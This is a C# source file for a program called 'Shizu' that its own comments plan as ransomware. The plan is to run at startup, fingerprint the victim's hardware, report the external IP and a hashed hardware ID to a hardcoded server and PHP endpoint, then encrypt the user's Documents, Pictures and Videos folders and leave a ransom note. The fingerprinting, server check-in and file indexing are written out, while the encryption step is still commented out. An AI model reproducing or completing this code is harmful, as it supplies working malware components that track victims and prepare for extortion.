using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Specialized;
using System.Management;
using System.Text.RegularExpressions;
/* 
*  To-do:
*       [✓]  Check if server is up
*       [✗]  If server is down, killswitch
*       [✓] Index all files 
*       [✓] Create unique HWID and send it to the server
*       [✗]  Create file with info about what to do on the desktop
*       [✗]  Securely send Client (like HWID) info to server via php AND send that to a database
*       [✗]  Encrypt Documents folder, Pictures folder, Videos folder first
*       [✗]  Import the Encryption code to a seperate .cs file
*       [✗]  Import the Decryption code to a seperate .cs file
*       [✗]  Delete files securely
*       [✗]  Optimize crypter algorithm
*      
*  Flow:
*       - Program runs after startup (so after rebooting)
*  
*       - Check if the client has an internet connection by pinging google.com
*           - Has an internet connection --> Ping the server to check if the server is up and connectable
*               - Server is pingable --> Proceed to HWID(), TransferInfo() and then to Encrypt()
*               - Server is NOT pingable --> activate Deathswitch()
*           - Has NO internet connection --> Proceed to HWID() and then to Encrypt()
*       - Create a HWID by retrieving, combining and hashing many pseudo-unique values (that don't change after reboot) to make it unique and to identify every computer
*           - Try to get as much as possible (valueable) info
*               - Catch --> Don't use the info you couldn't get
*           - Combine all that info into 1 string
*           - Hash that string with Hash(), this returns the now hashed HWID
*       - If the client has an internet connection, get the external IP and send the hashed HWID to the server running on NGINX and PHP
*           - Try to get the external ip and store it
*           - The server verifies the input, by checking that also a hardcoded secret code is sent to the server. (ip, hwid, secretcode)
*               - Verified --> The PHP puts the ip and hwid into the database (sql) together with an auto incremented id and datetime
*               - NOT Verified -> The server does nothing
*       - Create a file on the desktop on what to do with ReadMe()
*           - This file contains info about:
*               - Name of the program and the group, what happened and what to do
*               - HWID (for if there was no internet connection), E-mail address
*       - Run the encryption with Encrypt()
*           - For each file, encrypt it smartly with an encrypted version of the hashed hwid (it must always be a precise size depending on what encryption method)
*           
*       - Change background (?)
*           

*/

namespace Shizu {
    class Program {
        static void Main(string[] args) {


            Ping();
            SubmitForm();

            // Exit
            ShowErrors();
            Console.ReadLine();
        }

        public static bool[] errorList = new bool[11];

        private static void Ping() {
            //Check if has internet connection
            Ping onlineChecker = new Ping();
            bool isOnline = false;

            try {
                PingReply onlineReply = onlineChecker.Send("google.com");
                isOnline = true;
            } catch {
                // Has no connection to the internet
                isOnline = false;
            }

            if (isOnline) {
                Ping pinger = new Ping();
                try {
                    PingReply reply = pinger.Send("188.166.7.188");
                    Console.WriteLine("Server is online");
                } catch {
                    Console.WriteLine("Server is OFFLINE");
                    Deathswitch();
                    errorList[0] = true;
                }
            } else {
                // Has no connection to the internet. Still encrypt and save the hwid in the instructions.txt
            }
        }

        private static void Deathswitch() {
            Console.WriteLine("DEATHSWITCH");
        }

        private static string HWID() {
            try {

                string pr_name = "";
                string pr_manufacturer = "";
                ushort pr_revision = 1;
                string pr_processorid = "";
                string pr_unique = "";
                uint pr_maxClockSpeed = 1;
                uint pr_numberOfCores = 1;
                ulong ra_capacity = 1;
                uint ra_speed = 1;
                string gp_name = "";
                string gp_manufacturer = "";
                uint gp_maxRefreshRate = 1;
                string sc_name = "";
                string id_name = "";
                string os_name = "";
                string os_winDir = "";

                try {
                    using (ManagementObjectSearcher MOS_pr = new ManagementObjectSearcher("select * from Win32_Processor")) {
                        foreach (ManagementObject pr in MOS_pr.Get()) {
                            pr_name = (string)pr["Name"];
                            pr_manufacturer = (string)pr["Manufacturer"];
                            pr_revision = (ushort)pr["Revision"];
                            pr_processorid = (string)pr["ProcessorId"];
                            pr_maxClockSpeed = (uint)pr["MaxClockSpeed"];
                            pr_numberOfCores = (uint)pr["NumberOfCores"];
                        }
                        //Console.WriteLine("Processor Name: " + pr_name + "\nProcessor Manufacturer: " + pr_manufacturer + "\nProcessor Revision: " + pr_revision + "\nProcessor ID: " + pr_processorid + "\nProcessor Max Clock Speed: " + pr_maxClockSpeed + "\nProcessor Max Cores: " + pr_numberOfCores);
                    }
                } catch {
                    errorList[4] = true;
                }

                try {
                    using (ManagementObjectSearcher MOS_ra = new ManagementObjectSearcher("select * from Win32_PhysicalMemory")) {
                        foreach (ManagementObject ra in MOS_ra.Get()) {
                            ra_capacity += (ulong)ra["Capacity"];
                            ra_speed = (uint)ra["Speed"];
                        }
                        //Console.WriteLine("Memory Capacity: " + ra_capacity + "\nMemory Speed: " + ra_speed);
                    }
                } catch {
                    errorList[5] = true;
                }

                try {
                    using (ManagementObjectSearcher MOS_gp = new ManagementObjectSearcher("select * from Win32_VideoController")) {
                        foreach (ManagementObject gp in MOS_gp.Get()) {
                            gp_name = (string)gp["Description"];
                            gp_maxRefreshRate = (uint)gp["MaxRefreshRate"];
                        }
                        //Console.WriteLine("GPU Name: " + gp_name + "\nGPU Max Refresh Rate: " + gp_maxRefreshRate);
                    }
                } catch {
                    errorList[6] = true;
                }
                try {
                    using (ManagementObjectSearcher MOS_sc = new ManagementObjectSearcher("select * from Win32_SCSIController")) {
                        foreach (ManagementObject sc in MOS_sc.Get()) {
                            sc_name = (string)sc["Name"];
                        }
                        //Console.WriteLine("SCSIC Name: " + sc_name);
                    }
                } catch {
                    errorList[7] = true;
                }

                try {
                    using (ManagementObjectSearcher MOS_id = new ManagementObjectSearcher("select * from Win32_IDEController")) {
                        foreach (ManagementObject id in MOS_id.Get()) {
                            id_name = (string)id["Manufacturer"];
                        }
                        //Console.WriteLine("IDE Name: " + id_name);
                    }
                } catch {
                    errorList[8] = true;
                }

                try {
                    using (ManagementObjectSearcher MOS_os = new ManagementObjectSearcher("select * from Win32_OperatingSystem")) {
                        foreach (ManagementObject o in MOS_os.Get()) {
                            os_name = (string)o["Name"];
                            os_winDir = (string)o["WindowsDirectory"];
                        }
                        //Console.WriteLine("OS Name: " + os_name + "\nWindows Directory: " + os_winDir);
                    }
                } catch {
                    errorList[9] = true;
                }

                string HWID = Hash("Shizu#" + pr_name + "#" + pr_manufacturer + "#" + pr_maxClockSpeed + "#" + pr_numberOfCores + "#" + ra_capacity + "#" + gp_name + "#" + sc_name + "#" + id_name + "#" + os_name + "#" + pr_revision + "#" + pr_processorid);
                Console.WriteLine(HWID);
                return HWID;

            } catch {
                errorList[3] = true;
                string MachineName = Environment.MachineName;
                string CPUName = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
                int ProcessorCount = Environment.ProcessorCount;
                string fallback = "NH#" + MachineName + CPUName + ProcessorCount;
                return fallback;
            }
        }

        private static string Hash(string h) {
            try {
                var crypter = new System.Security.Cryptography.SHA256Managed();
                var hash = new System.Text.StringBuilder();
                byte[] crypto = crypter.ComputeHash(Encoding.UTF8.GetBytes(h));
                foreach (byte theByte in crypto) {
                    hash.Append(theByte.ToString("x2"));
                }
                return hash.ToString();
            } catch {
                string MachineName = Environment.MachineName;
                string CPUName = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
                int ProcessorCount = Environment.ProcessorCount;
                string fallback = "YH#" + MachineName + CPUName + ProcessorCount;
                errorList[10] = true;
                return fallback;
            }
        }

        private static string GetExternalIP() {
            try {
                WebClient w = new WebClient();
                string ExternalIP = w.DownloadString("http://icanhazip.com");
                w.Dispose();
                return Regex.Replace(ExternalIP, @"\s+", "");
            } catch {
                errorList[1] = true;
                return "Error";
            }
        }

        private static void GetFiles(string dir) {
            try {
                if ((File.GetAttributes(dir) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
                    foreach (string d in Directory.GetDirectories(dir)) {
                        GetFiles(d);
                    }
                    foreach (string f in Directory.GetFiles(dir)) {
                        // Do the encryption here
                        //Crypter(f);
                        Console.WriteLine(f);
                    }
                }
            } catch (System.Exception excpt) {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void SubmitForm() {
            string url = "https://synulation.xyz/testing.php";

            using (var client = new WebClient()) {
                try {
                    var values = new NameValueCollection();

                    values["1"] = GetExternalIP();
                    values["2"] = HWID();
                    values["3"] = "68f6e52d3581c022fbb3b61d3bfdafc70280972ecbe5a5715ef7e688e0be0ad7";
                    values["4"] = Hash(values["2"]);
                    values["5"] = "544e77787542eb679be583bcac05c67d497c2c516e2c9cd1c1400b1b53f314b0";
                    values["6"] = values["2"].Substring(0, 32);
                    values["7"] = "76a04d498fd105c68c282814deb8ab717cba68a09271f365c78f0ead54d669a1";
                    values["8"] = "6a5532e3cf1c27bedad40a2a5192642f50bcc33bd0d8e08b74758906ba13de00";
                    values["submit"] = "";

                    var response = client.UploadValues(url, values);
                    errorList[2] = false;
                } catch {
                    errorList[2] = true;
                }
            }
        }

        static void ShowErrors() {
            bool errorWarning = false;

            string[] errorListInfo = new string[11];
            errorListInfo[0] = "Ping to server";
            errorListInfo[1] = "Get external IP";
            errorListInfo[2] = "SubmitForm(), submit to the PHP form on the server";
            errorListInfo[3] = "HWID Creation Total";
            errorListInfo[4] = "HWID Creation Processor";
            errorListInfo[5] = "HWID Creation Memory";
            errorListInfo[6] = "HWID Creation GPU";
            errorListInfo[7] = "HWID Creation SCSIC";
            errorListInfo[8] = "HWID Creation IDE";
            errorListInfo[9] = "HWID Creation OS";
            errorListInfo[10] = "Hash Function";

            int l = errorList.GetLength(0);
            Console.WriteLine("\n\nError List:");

            for (int i = 0; i < l; i++) {
                Console.Write(i + ": ");

                if (errorList[i]) {
                    errorWarning = true;
                    Console.ForegroundColor = ConsoleColor.Red;
                }

                Console.Write(errorList[i] + " - ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(errorListInfo[i]);
            }

            if (errorWarning) {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("!!! WARNING: YOU HAVE ERRORS !!!");
                Console.ForegroundColor = ConsoleColor.White;
            }
        }

    }
}
